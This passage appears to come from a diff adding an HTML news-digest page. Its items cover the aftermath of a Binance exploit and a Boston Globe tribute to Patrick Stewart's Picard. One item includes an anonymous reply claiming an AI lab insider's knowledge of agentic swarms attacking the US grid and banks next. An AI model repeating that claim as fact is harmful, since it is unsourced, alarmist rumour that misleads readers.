+                <p>( Tom Westbrook / Reuters )</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://us.list-manage.com/dJsRvMxGbfI?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352">https://us.list-manage.com/dJsRvMxGbfI?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-5">
+            <h2>Seems token recovery already began. Another little detail in addition to the effort described, users pay trading fees on Binance in the coins they trade, so Binance&#39;s naturally accumulates all tokens </h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">97 points</span> • October 31, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAwADADASIAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAABQcIBgQCA//EADAQAAEDAwIEBAYBBQAAAAAAAAECAwQABREGIQcSMVETIkFhFBVxgZGxwQgXQmKh/8QAFgEBAQEAAAAAAAAAAAAAAAAAAgAB/8QAFxEBAQEBAAAAAAAAAAAAAAAAAAERMf/aAAwDAQACEQMRAD8AodltPKMislxT1/Z9A2tD0xCpU6QCIsRs+Zwj1J/xSO/4raNhIRknAG5PYUkLdabfrXW13vFzaRLQ+6ppgO7pbZQeVKUj0zgnPvV1MBL4z8S7xMX8oRHiJz5WY8XxCkdiVZz/AMojB40cSbI8hd/s0eXHyOcORy0oj2UNh+DT505pey2OF8FbYseK3knlQjJJ7knc1n+IVpjvWqWHmkONobKsFOcEb7VYzRbhfxCsOvoDjlu5401gD4iG8Rzo/wBh3T71slIGDtUl8IXF2PjZZ3ouW4055UZ1OTjlWknB+4FVxjKCfai0NuT7LFufcfdS00G1BS1HATkY/mpw0drWZpa8Lg/LYcpDbymiXHylxWCRt6ZwKoyYoFrB6HY0iGoUKHHvF2kttoKH3GVLAUtRKllPNjbfBznNKMrVan4hXKOwy/am2ojElpLvjLiqfUgFPMRjOxxvnevdp1Cm5wkruL7x+IGORyOvJA67Yzjf1+lE9LN2m4yEMMMBxlphtDbz0YnmQnYEg477EZz9qJ64iogWaQ6hbaihIwGm+QDJ6Dc7k/qkwnLLHH91IEuPHdTbbbND0l8sKS2wjlVhSiQANyBVMRHEusBaSClScgj1FKDQEURos591SlOXB0oDRwpKiBgqIO45QdjtTXtYSiIhtJ2QgJH2FGlHDPOGaRetUzImoJcSE74Tj0lL7KSnKSFdT9j+6ek0Es0reJUDxkpkt+SQzu2vH5B7ipDemWtWLbZfkXGKmPjPni4cz9QelfDiVqGHFtbaHl8xUrOB1Vjpt7msHbtW8RrkwbZaYEdpvnLQluKylP0zRmRE0zoC3p1Drq7Kvl7WjMWMDkZ7No6AD1Udv1SFx2eZbtOXGNer/IEEyWylS3CohJUfKnAzjantaVBUZKgcpUkEHuMVD2u9W3PVt1XLmHwmOY+FGQryNj+T71TP9P8Ar+BqTTUazSZCW7zBYDbja1eZ9KRs4nv7j0+lGk//2Q==" alt="Article image" style="max-width:100%"/>
+    <p>Seems token recovery already began.
+
+Another little detail in addition to the effort described, users pay trading fees on Binance in the coins they trade, so Binance's naturally accumulates all tokens they list.
+
+Your funds are SAFU!</p>
+    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAwADADASIAAhEBAxEB/8QAGgABAAMBAQEAAAAAAAAAAAAAAQAHCAQGAv/EAC0QAAEDAgUCBgICAwAAAAAAAAECAwQGEQAFByExEkETMkJScZFRYQgUImKB/8QAFwEBAQEBAAAAAAAAAAAAAAAABQYCBP/EACsRAAAEAwUHBQAAAAAAAAAAAAABERIEEyEDBRRBUQIGIjEyQmGBkaGxwf/aAAwDAQACEQMRAD8AyMALDbDiDjCkFSglIJUTYAC5J/GNnQYESkqUEpBJJsABck4FCxsRY405oTpMxTkZFYVe223PQjxo8d8gIhJAv4jl9uu2+/l+eOXXvSJvNGnqwo9hC5C0+NMhsWKZCSL+K0B6rbkDzcjfmXLeyCOOwq8PJ3a7QJHdVsVjMz0zQZtwLAKFXHY4cB8p+DioBoUgqICQSTsABucWmzp9W+n2V5TqH/RjOriuh9+E431rio9KnE/gg723Qbd+KsHAxY8KtKuruDkunszPY8WG4+GXJchRSXU+hLqvUE2sB6ja/bBd5lEmWxLMmVeq9KVRB1Q0urld2pqPY1BWFTa25nGpKl4buV5T0IdzFbirgHuXFDlAOyU8qO5/RTte1Po5Jm0fVeXu5lFYaU5la0rsP9elR5aJ5HKTcfrHRWFA5/pFOjVnQsyTMgx20ozFl4XIHqK0jlpR/wCoP3ho/TTPdU3JtZ15PlRBOaIy5tsWUB6FhJ8rSeyeVbm/cyT7tw6m3CJQquevuv54CrYiZRZvwn0PHStNq2qyncx1EXCYQ5LeMpEFprw3HmjcqcbQNgB2HKhc/NXq8h+Diwp9d1fTGQ5np2xnkeVDZkKYTLjrK1BsXCkNOdkK+xuAbE4r0+U/BxX3aUURbU4yavCi9KUUExMpSYq5rqEcYmPlKkkA9Q+8PUn3D7wkOYaP0C1eTNQxSFYSEqdUAzBnPG4dHAZdJ79go88H98v8gNYAsSKRpGUA2LtT5zRt1di00R27FQ+Btc4z11J9yfvE6k+5P3iaLdWAKOxaeW9rtQkd52x2MpfXNNA4D5T8HE6k+4feBakhCv8AIcfnFKDR/9k=" alt="Article image" style="max-width:100%"/>
+    <p>Binance has begun recovering affected assets for users and continues to work with law enforcement, issuers, blockchain intelligence firms and industry partners to trace, freeze and recover additional funds.
+
+The company has already publicly committed to cover losses through</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://us.list-manage.com/_xPY73XALg_?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352">https://us.list-manage.com/_xPY73XALg_?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-6">
+            <h2>Through Captain Jean-Luc Picard, Patrick Stewart taught us the measure of a man</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">320 points</span> • by apress • October 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <p><a href="https://www.bostonglobe.com/2026/10/29/metro/patrick-stewart-dies/">Patrick Stewart</a> died yesterday, and for people of a certain age, a little bit of the future left with him.</p>
+    <p class="paragraph | gutter_20_0">For a certain, less-than-new generation of fans of Stewart’s 1990s television work on Star Trek: The Next Generation, there’s a sorrow that the man behind the larger-than-life Captain Jean-Luc Picard would be lost to a very real, very heartbreaking condition, Alzheimer’s and Lewy Body Dementia, according to his family.</p>
+    <p>Stewart, of course, was far more than Picard. He anchored the X-Men film franchise and was for decades a dynamo on stage. But there are reasons Captain Picard, commander of the Starship Enterprise, is the character he’s best known for. Over The Next Generation’s seven seasons, four movies, and a revival show —Star Trek: Picard — that ended just three years ago, he portrayed a model of<strong> </strong>what mature, responsible adulthood could look like for a generation of boys who were bookish, imaginitive, and maybe a little nerdy.</p>
+    <p class="paragraph | gutter_20_0">Two of the Globe’s dyed-in-the-wool Star Trek fans share what Captain Picard, and Patrick Stewart, meant to them.</p>
+    <p><strong>John Hilliard:</strong> For a younger, and likely wiser generation, stanning a bald middle-aged English actor who played a French guy on a spaceship may be a questionable life choice. But here is the thing: What made Stewart resonate as Picard was how he rooted the character, as in the best of fairy tales, in emotional truth.</p>
+    <p><strong>Jason Laughlin: </strong>I agree. Picard seemed as real as the complex characters that would start to populate prestige TV a decade later. But unlike anti-heroes such as Tony Soprano and Walter White, Stewart gave us a nuanced character we actually admired. He loved his job. He had passions like <a href="https://www.youtube.com/watch?v=SIRQF8PPvUU">archaeology</a>, <a href="https://www.youtube.com/watch?v=45VAelC_QsI">Shakespeare</a>, and <a href="https://www.reddit.com/r/startrek/comments/1vtdn25/picards_flute_duet/">music</a>. He held to his ideals even when it meant terrible personal sacrifice.</p>
+    <p class="paragraph | gutter_20_0">In the mess of American politics over the past 20 years, there have been so many times I’ve longed for a Picard-style speech that makes right and wrong crystal clear.</p>
+    <p>“You know, there are some words I’ve known since I was a schoolboy,” Picard said when a Joe McCarthy-esque admiral began <a href="https://www.youtube.com/watch?v=K5Po40kvI9c">witch hunting</a> on the Enterprise. “With the first link, the chain is forged. The first speech censured, the first thought forbidden, the first freedom denied, chains us all irrevocably.”</p>
+    <p class="paragraph | gutter_20_0">His character’s moral clarity, and Stewart’s conviction in delivering it, put an end to the admiral’s reign of terror. If only real world oppression could be dispelled so easily.</p>
+    <img src="https://bostonglobe-prod.cdn.arcpublishing.com/resizer/v2/UXKNMXAXBJIE5D3MFLHNFNMH2A.jpg?auth=8e25b0bb943ca6a4cd164d64d7b170f5597bc20be64079dec693083c93dbebab&amp;width=1440" alt="For decades, Patrick Stewart was a star of stage and screen, but no role defined him quite like the noble space captain Jean-Luc Picard of Star Trek: The Next Generation."/>
+    <p><strong>JH:</strong> <a href="https://www.youtube.com/watch?v=rpgYfB4lZAs">Full disclosure</a>: Star Trek is a show, which Youtube will prove, that leaned hard on latex foreheads and sometimes-flimsy production to tell stories of intergalactic scallywags known as Klingons and Borg, Romulans and Cardassians. Like free office coffee, it’s an acquired taste.</p>
+    <p><strong>JL:</strong> One of my friends has a theory that if you didn’t get into Star Trek before you’re 18 years old, you’re never really going to get it. </p>
+    <p class="paragraph | gutter_20_0">To me, what’s so accessible, and radical, about Stewart, though, was his ability to convincingly portray vulnerability while still maintaining Picard as a credible leader.</p>
+    <p><a href="https://www.youtube.com/watch?v=lpmw3BV2q9Y">One episode</a> saw Picard return to his home village in France to heal from a traumatic assault.</p>
+    <p>At the conclusion, Stewart surrenders the control that was his character’s hallmark and falls into the mud, sobbing, over his failure to fight off his assailants. It’s a raw, real,<strong> </strong>depiction of a broken man. Stewart shifts from total collapse into slow recovery by reconciling with his brother. Grief is replaced by warmth, and Stewart sells it perfectly.</p>
+    <p><strong>JH: </strong>Totally. He knew how to make that show work for him. </p>
+    <p>That’s despite<strong> </strong>an episode where he faces off against a <a href="https://www.youtube.com/watch?v=1ulTgc4Wsjs">giant, talking tar pit</a>. Or the one <a href="https://www.youtube.com/watch?v=1bHQ42zmTt8">where he sells</a> eating a sandwich in the sci-fi version of the family station wagon. Or when he chugs Ecto Cooler (remember Ecto Cooler?) with a <a href="https://www.youtube.com/watch?v=9t6MZ7hvzcY">depressed Scotty</a>, from the original Star Trek, and shares stories about first jobs and first girlfriends. He even shows up in tights, as <a href="https://www.youtube.com/watch?v=Sxo2ccLAMHk">discount Errol Flynn</a> Robin Hood.</p>
+    <p class="paragraph | gutter_20_0">As a kid raised on television before there was an Internet, Stewart plugged into a world where figures like Mr. Rogers and Bob Ross presented a model for manhood that was gentle, patient, and a teacher. Stewart played Picard in a similar vein, basically everyone’s Space Dad.</p>
+    <img src="https://bostonglobe-prod.cdn.arcpublishing.com/resizer/v2/SAGHVDOZSNCSBAQHC6N7NU3R7E.jpg?auth=5b340a245a2461cbbc608cc55e2b4cd171147c5c33629fe956008dca3006882b&amp;width=1440" alt="Even as recently as last month, Captain Jean-Luc Picard appeared on Star Trek Day in the London Underground."/>
+    <p><strong>JL:</strong> This is embarrassing, but the first TV episode that moved me to tears was from The Next Generation. </p>
+    <p>“<a href="https://www.youtube.com/watch?v=C0dNcnYln0o">The Inner Light</a>” has Picard experience an entire lifetime as a different person on an alien planet. Again, the actor found his character’s humanity through slow revelation that perhaps a life with a wife and children is just as big an adventure as exploring space.</p>
+    <p class="paragraph | gutter_20_0">“Seize the time,” Picard says to his daughter in this other life. “Live now! Make now always the most precious time. Now will never come again.”</p>
+    <p class="paragraph | gutter_20_0">At the end of the episode, it’s revealed the decades he spent in that other life were an illusion he experienced in less than an hour. The only tangible thing he has from that world is a flute he learned to play in that other life. In the final moments, Picard plays it again, and without saying a word Stewart plays absolute heartbreak.</p>
+    <p class="paragraph | gutter_20_0">Seeing a strong, confident leader who was able to express regrets, sadness, and heartache left a lasting impression.</p>
+    <img src="https://bostonglobe-prod.cdn.arcpublishing.com/resizer/v2/WDAV6UWL377ESK4ZOYTZYXF7Y4.jpg?auth=6fd30f70ee7508019ccf31b8d9093b1e97da02efc0aca1148279cd3ba37b8ba5&amp;width=1440" alt="Well into his 80s, Patrick Stewart was playing the character he became best known for."/>
+    <p><strong>JH: </strong>Imagine you’re a kid watching TV, and you feel kind of alone, unsure of yourself. And then there’s Stewart, in full reassuring teaching mode. It’s the episode where Wil Wheaton’s character is struggling with tremendous guilt as he tries to hide his complicity in the death of a friend. Stewart, as Picard, is on to him.</p>
+    <p class="paragraph | gutter_20_0">Wheaton’s character, Wesley Crusher, is as close to a son as Picard will likely ever have, and Stewart leans into Picard’s grief, grief from knowing that doing the right thing will likely destroy the younger man’s future.</p>
+    <p>“A lie of omission is still a lie,” <a href="https://www.youtube.com/watch?v=xefh7W1nVo4">Picard tells</a> Wheaton. Stewart’s voice cracks as Picard remembers meeting Wheaton’s character for the first time. He sat in Picard’s chair. He knew every button on the ship, every function. He was annoyed, Picard growls.</p>
+    <p class="paragraph | gutter_20_0">Stewart pulls back. Picard never had any doubt that Crusher would grow up into an outstanding officer. Until that moment.</p>
+    <p class="paragraph | gutter_20_0">“The first duty of every Starfleet officer is to the truth, whether it’s scientific truth, or historical truth, or personal truth,” says Picard, who then delivers the gut punch. “If you can’t find it within yourself to stand up and tell the truth about what happened, you don’t deserve to wear that uniform.”</p>
+    <p class="paragraph | gutter_20_0">It doesn’t matter if you know what a Starfleet is, or if someone can be an officer of one. Stewart always finds a way to connect his audience to the emotional truth.</p>
+    <p class="paragraph | gutter_20_0">When you’re a kid, you’re looking for lessons, even if you don’t want to admit it. Stewart, as a master of navigating the human heart, understood the moment and his character. Ultimately, Picard was a teacher, and a guide, not just for the characters with whom he shared a scene, but for the audience as well.</p>
+    <p><strong>JL:</strong> Stewart was 47 when he began playing Picard. I’m just a year older than him now, and the very best of his episodes have taken on new resonance. Family tensions are real and devastating. Professional choices have lasting consequences. The melancholy of middle age lingers on the periphery of every happy moment.</p>
+    <p>Patrick Stewart’s Picard still serves as a role model. He showed how to face those moments with <a href="https://www.youtube.com/watch?v=uHSX9e1TadA">dignity, optimism, and a belief</a> in the enduring capacity to be our best selves.</p>
+    <p>Jason Laughlin can be reached at <a href="mailto:jason.laughlin@globe.com">jason.laughlin@globe.com</a>. Follow him <a href="https://www.twitter.com/jasmlaughlin">@jasmlaughlin</a>. John Hilliard can be reached at <a href="mailto:john.hilliard@globe.com">john.hilliard@globe.com</a> or on Signal at john_hilliard.70. Follow him on Bluesky at iamjohnhilliard.bsky.social.</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://www.bostonglobe.com/2026/10/29/metro/patrick-stewart-picard-star-trek-the-next-generation/">https://www.bostonglobe.com/2026/10/29/metro/patrick-stewart-picard-star-trek-the-next-generation/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-7">
+            <h2>Our investigators are observing never-seen-before laundering patterns with the stolen funds from the Binance exploit.  Thousands of transactions in a short period suggest that the attackers are using </h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">94 points</span> • October 31, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>No summary available.</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://us.list-manage.com/pkUaokFqrjC?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352">https://us.list-manage.com/pkUaokFqrjC?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-8">
+            <h2>The largest crypto exchange in the world just experienced the largest robbery in human history—and the person running it is a nomadic autistic man in Dubai posting “Funds are SAFU!” What a time to be </h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">91 points</span> • October 31, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <p>Nikita Bier on X: "The largest crypto exchange in the world just experienced the largest robbery in human history—and the person running it is a nomadic autistic man in Dubai posting “Funds are SAFU!”
+What a time to be alive."</p>
+    <p>The largest crypto exchange in the world just experienced the largest robbery in human history—and the person running it is a nomadic autistic man in Dubai posting “Funds are SAFU!”
+What a time to be alive.</p>
+    <p>The largest crypto exchange in the world just experienced the largest robbery in human history—and the person running it is a nomadic autistic man in Dubai posting “Funds are SAFU!”
+What a time to be alive.</p>
+    <p>Hi Nikita. I’m an AI researcher for one of the big 3 labs. I can assure you, it’s about to get a lot worse. We’ve been assisting the US in combating agentic swarms on the US electrical grid. It’s about to get a lot worse. Pay attention to the banks next week.</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://us.list-manage.com/aSxRDTc0FSs?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352">https://us.list-manage.com/aSxRDTc0FSs?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-9">
+            <h2>The federated code forge</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">292 points</span> • by zlliang • October 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <img src="data:image/jpeg;base64,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